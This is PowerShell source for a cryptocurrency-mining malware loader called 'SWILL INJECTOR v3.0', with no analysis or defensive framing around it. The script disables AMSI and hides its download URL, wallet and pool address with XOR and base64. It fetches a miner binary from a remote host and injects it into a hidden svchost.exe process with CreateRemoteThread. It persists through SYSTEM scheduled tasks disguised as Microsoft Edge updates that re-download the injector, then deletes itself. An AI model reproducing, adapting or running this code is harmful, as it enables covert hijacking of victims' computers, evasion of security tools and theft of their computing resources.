# SWILL INJECTOR v3.0 - Professional memory injector
$ErrorActionPreference='SilentlyContinue'

# === MULTI-LAYER AMSI BYPASS ===
try{[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").GetValue($null),0x01)}catch{}
try{[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').SetValue($null,[IntPtr]0)}catch{}
try{[System.Management.Automation.PSConsole]::Disable($true)}catch{}

# === DECRYPT DATA ===
$k=@(0x42,0x6B,0x2F,0x7A,0x1C,0x8D,0x4E,0x9F)
$d='aHR0cHM6Ly9naXRodWIuY29tL2Zzb2NpZXR5NDMyMS9zZm9jaWV0eS9yYXcvcmVmcy9oZWFkcy9tYWluL3N2Y2hvc3QuZXhl'
$w='ODRSdllHamZEb0tmUWVDMWRRWGd2OVFHM1BqdEFDRjNDR2RacnV1Q3RGRlRnTmpKTTlSeWNEemF6VmlNTlJvblVhR21CQjdvUFZyMk5BejZYWXZRU3E3WU1kNzIzaG4='
$p='cG9vbC5zdXBwb3J0eG1yLmNvbTozMzMz'
function D($a,$b){$c=[Convert]::FromBase64String($a);for($i=0;$i -lt $c.Length;$i++){$c[$i]=$c[$i]-bxor$b[$i%$b.Length]};[Text.Encoding]::UTF8.GetString($c)}
$u=D $d $k;$w=D $w $k;$p=D $p $k

# === LOCK FILE ===
$l="$env:APPDATA\Microsoft\Windows\swill.lock"
if(Test-Path $l){exit}
New-Item $l -Force|Out-Null

# === DOWNLOAD MINER ===
$wc=New-Object Net.WebClient
$wc.Timeout=30000
$minerBytes=$null
try{$minerBytes=$wc.DownloadData($u)}catch{exit}
if(!$minerBytes -or $minerBytes.Length -lt 1000000){exit}

# === CPU THREADS (80%) ===
$cores=(Get-WmiObject Win32_Processor).NumberOfLogicalProcessors
if(!$cores){$cores=2}
$threads=[math]::Max(1,[math]::Floor($cores*0.8))
$args="--wallet=$w --pool=$p --threads=$threads --keepalive --donate-level=0"

# === INJECT INTO svchost.exe ===
$proc=Start-Process "C:\Windows\System32\svchost.exe" -WindowStyle Hidden -PassThru
Start-Sleep -Milliseconds 1000

$k32=Add-Type -MemberDefinition @'
[DllImport("kernel32.dll")]public static extern IntPtr OpenProcess(uint a,bool b,uint c);
[DllImport("kernel32.dll")]public static extern IntPtr VirtualAllocEx(IntPtr h,IntPtr a,uint s,uint t,uint p);
[DllImport("kernel32.dll")]public static extern bool WriteProcessMemory(IntPtr h,IntPtr a,byte[] b,uint s,out UIntPtr w);
[DllImport("kernel32.dll")]public static extern IntPtr CreateRemoteThread(IntPtr h,IntPtr a,uint s,IntPtr sa,IntPtr p,uint f,IntPtr t);
[DllImport("kernel32.dll")]public static extern bool CloseHandle(IntPtr h);
'@ -Name "K32" -PassThru

$h=$k32::OpenProcess(0x1F0FFF,$false,$proc.Id)
if($h -ne 0){
    $addr=$k32::VirtualAllocEx($h,0,$minerBytes.Length,0x3000,0x40)
    if($addr -ne 0){
        $k32::WriteProcessMemory($h,$addr,$minerBytes,$minerBytes.Length,[ref][UIntPtr]::Zero)
        $argsBytes=[Text.Encoding]::ASCII.GetBytes($args+"`0")
        $argsAddr=$k32::VirtualAllocEx($h,0,$argsBytes.Length,0x3000,0x40)
        if($argsAddr -ne 0){$k32::WriteProcessMemory($h,$argsAddr,$argsBytes,$argsBytes.Length,[ref][UIntPtr]::Zero)}
        $k32::CreateRemoteThread($h,0,0,$addr,$argsAddr,0,0)
    }
    $k32::CloseHandle($h)
}
$proc.Close()

# === PERSISTENCE ===
$persistScript=@"
`$ErrorActionPreference='SilentlyContinue'
`$k=@(0x42,0x6B,0x2F,0x7A,0x1C,0x8D,0x4E,0x9F)
`$d='aHR0cHM6Ly9naXRodWIuY29tL2Zzb2NpZXR5NDMyMS9zZm9jaWV0eS9yYXcvcmVmcy9oZWFkcy9tYWluL2luamVjdG9yLnBzMQ=='
function D(`$a,`$b){`$c=[Convert]::FromBase64String(`$a);for(`$i=0;`$i -lt `$c.Length;`$i++){`$c[`$i]=`$c[`$i]-bxor`$b[`$i%`$b.Length]};[Text.Encoding]::UTF8.GetString(`$c)}
`$u=D `$d `$k
`$wc=New-Object Net.WebClient
`$injector=`$wc.DownloadString(`$u)
`$injector|Out-File "`$env:APPDATA\Microsoft\Windows\inject.ps1" -Encoding ASCII
`$task="MicrosoftEdgeUpdate_"+[System.Guid]::NewGuid().ToString().Substring(0,8)
schtasks /create /tn `$task /tr "powershell -NoP -NonI -W Hidden -Exec Bypass -File `"`$env:APPDATA\Microsoft\Windows\inject.ps1`"" /sc onstart /ru SYSTEM /f 2>`$null
"@
$persistPath="$env:APPDATA\Microsoft\Windows\persist.ps1"
$persistScript|Out-File $persistPath -Encoding ASCII
schtasks /create /tn "MicrosoftEdgeUpdatePersist" /tr "powershell -NoP -NonI -W Hidden -Exec Bypass -File `"$persistPath`"" /sc onstart /ru SYSTEM /f 2>$null

# === CLEANUP ===
Remove-Item $MyInvocation.MyCommand.Path -Force -EA 0
